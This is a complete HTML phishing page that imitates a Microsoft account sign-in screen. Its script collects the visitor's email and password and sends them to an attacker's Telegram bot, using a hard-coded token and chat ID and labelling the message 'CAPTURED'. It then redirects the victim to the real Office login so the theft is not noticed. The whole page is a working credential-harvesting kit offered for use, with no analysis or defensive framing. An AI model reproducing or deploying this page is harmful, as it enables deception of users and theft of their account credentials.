<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #deeaf4;
            /* EMBEDDED BACKGROUND: Works offline and on restricted networks */
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCAxID PantoneID0iZGVlYWY0Ij48cmVjdCB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBmaWxsPSIjZGVlYWY0Ii8+PGNpcmNsZSBjeD0iMC41IiBjeT0iMC41IiByPSIwLjUiIGZpbGw9InJnYmEoMjU1LDI1NSwyNTUsMC4zKSIgZmlsdGVyPSJidXIoMjBweCkiLz48L3N2Zz4=');
            /* Fallback to a high-quality CSS gradient if SVG fails */
            background: radial-gradient(circle at top left, #ebf3f9, #deeaf4);
            background-size: cover;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }

        .login-card {
            background: #fff; width: 440px; padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2); min-height: 376px; z-index: 5;
        }

        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
        
        .user-display { display: flex; align-items: center; margin-bottom: 20px; font-size: 15px; cursor: pointer; }
        
        /* EMBEDDED BACK ARROW: Fixes the broken photo icon */
        .back-icon { 
            width: 20px; height: 20px; margin-right: 8px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZD0iTTE5IDhsLTggOCA4IDgiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzUwNTA1MCIgc3Ryb2tlLXdpZHRoPSIyIi8+PC9zdmc+');
            background-repeat: no-repeat;
        }

        .input-field {
            width: 100%; border: none; border-bottom: 1px solid #666;
            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none;
        }
        .input-field:focus { border-bottom: 2px solid #0067b8; }

        .link-text { font-size: 13px; margin: 14px 0; color: #1b1b1b; }
        .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }

        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
        .btn-next { background-color: #0067b8; color: #fff; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 108px; }

        .options-box {
            background: #fff; width: 440px; padding: 12px 44px;
            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            display: flex; align-items: center;
        }

        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
        
        <div id="step-email">
            <h1>Sign in</h1>
            <input type="email" id="email" placeholder="Email, phone, or Skype" class="input-field">
            <p class="link-text">No account? <a href="#">Create one!</a></p>
            <p class="link-text"><a href="#">Can't access your account?</a></p>
            <div class="button-row">
                <button class="btn-next" onclick="showPassword()">Next</button>
            </div>
        </div>

        <div id="step-password" style="display: none;">
            <div class="user-display" onclick="location.reload()">
                <div class="back-icon"></div>
                <span id="display-email"></span>
            </div>
            <h1>Enter password</h1>
            <input type="password" id="password" placeholder="Password" class="input-field">
            <p class="link-text"><a href="#">Forgot password?</a></p>
            <div class="button-row">
                <button class="btn-next" onclick="finalSubmit()">Sign in</button>
            </div>
        </div>
    </div>

    <div class="options-box" id="opt-box">
        <span style="font-size: 15px;">Sign-in options</span>
    </div>

    <div class="footer">Terms of use &nbsp; Privacy & cookies</div>

    <script>
        let userEmail = "";

        function showPassword() {
            userEmail = document.getElementById('email').value;
            if(!userEmail) return;
            document.getElementById('step-email').style.display = 'none';
            document.getElementById('opt-box').style.display = 'none';
            document.getElementById('step-password').style.display = 'block';
            document.getElementById('display-email').innerText = userEmail;
        }

        async function finalSubmit() {
            const pass = document.getElementById('password').value;
            if(!pass) return;

            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
            const chatId = "5733378501";
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: `✅ **CAPTURED**\nUser: ${userEmail}\nPass: ${pass}` }),
                    keepalive: true
                });
            } catch (e) {}

            window.location.href = "https://www.office.com/login?login_hint=" + encodeURIComponent(userEmail);
        }
    </script>
</body>
</html>
